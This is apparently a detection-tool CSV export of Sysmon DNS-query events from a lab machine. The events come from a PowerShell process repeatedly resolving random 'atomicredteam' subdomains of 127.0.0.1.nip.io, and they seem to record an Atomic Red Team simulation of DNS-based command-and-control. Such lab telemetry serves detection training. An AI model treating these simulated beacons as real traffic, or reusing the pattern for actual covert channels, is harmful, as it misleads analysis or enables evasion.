"Timestamp","RuleTitle","Level","Computer","Channel","EventID","MitreTactics","MitreTags","OtherTags","RecordID","Details","ExtraFieldInfo","RuleFile","RuleID","EvtxFile"
"2025-12-26 11:26:49.175 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174192,"Query: atomicredteam-334802.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:48.646","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:49.175 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174193,"Query: atomicredteam-297906.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:48.686","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:49.176 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174194,"Query: atomicredteam-718085.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:48.726","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:49.176 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174195,"Query: atomicredteam-139504.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:48.766","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:49.176 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174196,"Query: atomicredteam-893927.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:48.806","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:49.176 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174197,"Query: atomicredteam-711552.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:48.846","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:49.176 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174198,"Query: atomicredteam-863390.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:48.886","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:49.176 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174199,"Query: atomicredteam-607069.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:48.928","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:49.176 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174200,"Query: atomicredteam-361542.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:48.969","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:49.176 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174201,"Query: atomicredteam-571741.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:49.008","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:49.176 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174202,"Query: atomicredteam-291887.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:49.049","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:50.187 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174203,"Query: atomicredteam-125005.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:49.088","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:50.187 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174204,"Query: atomicredteam-608717.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:49.259","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:50.187 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174205,"Query: atomicredteam-630397.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:49.300","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:50.187 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174206,"Query: atomicredteam-108487.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:49.475","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:50.187 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174207,"Query: atomicredteam-558448.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:49.517","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:50.187 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174208,"Query: atomicredteam-91123.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:49.561","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:50.188 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174209,"Query: atomicredteam-682168.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:49.889","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:50.188 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174210,"Query: atomicredteam-416913.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:49.930","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:50.188 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174211,"Query: atomicredteam-603097.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:49.974","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:53.754 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174212,"Query: atomicredteam-846495.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:50.018","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:53.755 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174213,"Query: atomicredteam-773530.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:50.061","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:53.755 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174214,"Query: atomicredteam-39950.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:50.233","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:53.755 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174215,"Query: atomicredteam-544782.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:50.404","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:54.534 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174216,"Query: atomicredteam-215169.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:50.445","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:54.534 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174217,"Query: atomicredteam-839645.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:50.484","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:55.581 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174218,"Query: atomicredteam-356356.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:53.839","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:55.581 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174219,"Query: atomicredteam-376976.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:54.081","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:55.582 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174220,"Query: atomicredteam-660083.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:54.417","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:55.582 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174221,"Query: atomicredteam-948123.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:54.462","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:55.593 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174222,"Query: atomicredteam-463612.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:54.502","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:56.415 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174223,"Query: atomicredteam-619713.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:54.573","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:56.415 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174224,"Query: atomicredteam-184644.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:54.795","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:56.415 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174225,"Query: atomicredteam-136488.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:55.503","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:56.415 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174226,"Query: atomicredteam-145665.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:55.615","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:56.415 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174227,"Query: atomicredteam-649580.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:55.750","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:56.415 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174228,"Query: atomicredteam-789334.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:56.217","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:56.415 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174229,"Query: atomicredteam-981411.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:56.272","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:57.735 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174230,"Query: atomicredteam-766589.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:56.396","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:57.735 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174231,"Query: atomicredteam-978626.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:56.481","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:59.091 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174234,"Query: atomicredteam-186120.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:56.520","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:59.091 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174235,"Query: atomicredteam-132946.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:56.660","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:59.091 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174236,"Query: atomicredteam-51468.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:57.720","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:59.091 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174237,"Query: atomicredteam-932017.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:57.758","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:59.092 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174238,"Query: atomicredteam-912709.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:57.823","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
